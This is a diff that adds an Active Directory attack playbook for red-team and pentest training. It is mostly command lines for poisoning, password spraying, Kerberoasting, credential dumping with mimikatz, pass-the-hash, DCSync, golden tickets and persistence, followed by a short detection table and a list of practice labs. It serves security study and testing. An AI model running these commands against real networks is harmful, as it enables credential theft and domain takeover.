@@ -1,0 +1,260 @@
+Active Directory Attack Path Playbook
+
+Objective: Domain Compromise
+Focus: Realistic Attack Paths
+
+Usage: Red Team / Pentest / Security Research
+Typical AD Attack Lifecycle
+Initial Access
+ ↓
+Credential Harvesting
+ ↓
+Domain Enumeration
+ ↓
+Privilege Escalation
+ ↓
+Lateral Movement
+ ↓
+Domain Dominance
+ ↓
+Persistence
+
+Attack Path 1 — LLMNR → NTLM Capture → Pass-the-Hash
+Scenario
+
+A user authenticates on the network. The attacker captures the NTLM hash using LLMNR poisoning.
+
+Steps
+Start Responder
+responder -I eth0 -wrf
+Capture NTLM hash
+
+Example output
+
+SMB Hash captured
+user::DOMAIN:HASH
+Crack the hash
+hashcat -m 5600 hash.txt rockyou.txt
+Validate credentials
+crackmapexec smb 10.10.10.0/24 -u user -p password
+Lateral movement
+evil-winrm -i target -u user -p password
+
+
+Attack Path 2 — Password Spraying → Domain Access
+Scenario
+
+Weak password policies allow attackers to discover valid credentials.
+
+Enumerate users
+kerbrute userenum -d domain.local users.txt
+Password spray
+crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Welcome123'
+Access system
+evil-winrm -i target -u user -p password
+
+
+Attack Path 3 — Kerberoasting → Service Account → Privilege Escalation
+Scenario
+
+Service accounts often have weak passwords.
+
+Find SPNs
+Get-DomainUser -SPN
+Request service tickets
+Invoke-Kerberoast
+Crack the ticket
+hashcat -m 13100 hashes.txt rockyou.txt
+Login with cracked password
+evil-winrm -i target -u serviceaccount -p password
+
+
+Attack Path 4 — AS-REP Roasting
+Scenario
+
+Accounts with pre-authentication disabled allow offline password cracking.
+
+Extract AS-REP hash
+GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10
+Crack password
+hashcat -m 18200 hash.txt rockyou.txt
+Login
+evil-winrm -i target -u user -p password
+
+
+Attack Path 5 — BloodHound → Privilege Escalation Path
+Scenario
+
+A normal user has indirect privileges through AD relationships.
+
+Collect AD data
+SharpHound.exe -c All
+Load into BloodHound
+neo4j console
+bloodhound
+Find path
+
+Example:
+
+User → HelpDeskGroup → LocalAdmin → Server → Domain Admin
+Exploit
+
+Add user to group:
+
+net group "HelpDesk" user /add /domain
+
+
+Attack Path 6 — Credential Dumping → Domain Admin
+Scenario
+
+Administrator credentials stored in memory.
+
+Dump credentials
+mimikatz
+sekurlsa::logonpasswords
+Extract admin password
+
+Example
+
+Administrator
+Password: Password123
+Login to DC
+evil-winrm -i dc.domain.local -u Administrator -p Password123
+
+
+Attack Path 7 — Pass-the-Hash → Domain Compromise
+Scenario
+
+Administrator hash is captured.
+
+Authenticate using hash
+psexec.py domain/admin@target -hashes :NTLMHASH
+Dump domain credentials
+secretsdump.py domain/admin@dc-ip
+
+
+Attack Path 8 — Resource-Based Constrained Delegation (RBCD)
+Scenario
+
+User can create machine accounts.
+
+Create machine
+New-MachineAccount
+Configure delegation
+Set-ADComputer
+Exploit
+rbcd.py domain/user:password
+Obtain DA ticket
+Impersonate Administrator
+
+
+Attack Path 9 — ADCS Misconfiguration (ESC1)
+Scenario
+
+Certificate template allows privilege escalation.
+
+Enumerate templates
+certipy find
+Request certificate
+certipy req -u user@domain.local -p password -template vulnerable_template
+Authenticate
+certipy auth -pfx certificate.pfx
+
+
+Attack Path 10 — DCSync Attack
+Scenario
+
+User has replication rights.
+
+Dump KRBTGT
+lsadump::dcsync /domain:domain.local /user:krbtgt
+Extract domain hashes
+Administrator
+KRBTGT
+All domain users
+
+
+Attack Path 11 — Golden Ticket
+Scenario
+
+KRBTGT hash compromised.
+
+Create forged Kerberos ticket
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21 /krbtgt:HASH /ptt
+Access domain resources
+Unlimited domain access
+
+
+Attack Path 12 — Unconstrained Delegation
+Scenario
+
+Machine configured for unconstrained delegation.
+
+Find vulnerable hosts
+Get-DomainComputer -Unconstrained
+Extract tickets
+Rubeus.exe monitor
+Impersonate domain admin
+Pass the ticket
+
+
+Attack Path 13 — Shadow Credentials
+Scenario
+
+Attacker adds authentication keys to user object.
+
+Add shadow credential
+certipy shadow add
+Authenticate
+certipy auth
+
+
+Attack Path 14 — AdminSDHolder Persistence
+Scenario
+
+Backdoor privileged groups.
+
+Modify ACL
+Set-ADObject
+Persist access
+Every privileged account inherits the backdoor
+Realistic Enterprise Compromise Flow
+Initial Access (Phishing / VPN / Web App)
+ ↓
+Internal Recon
+ ↓
+LLMNR Poisoning
+ ↓
+Credential Capture
+ ↓
+Password Spray
+ ↓
+Domain Access
+ ↓
+Kerberoasting
+ ↓
+BloodHound Analysis
+ ↓
+Privilege Escalation
+ ↓
+Lateral Movement
+ ↓
+DCSync
+ ↓
+Golden Ticket
+ ↓
+Full Domain Control
+
+Detection Opportunities
+Stage	Detection Method
+Password spray	Failed logins
+Kerberoasting	Excessive TGS requests
+Mimikatz	LSASS access
+DCSync	Replication events
+Golden ticket	Abnormal Kerberos tickets
+
+Recommended Lab Practice
+HackTheBox AD labs
+TryHackMe AD paths
+VulnLab AD environments
+CRTP / CRTE labs
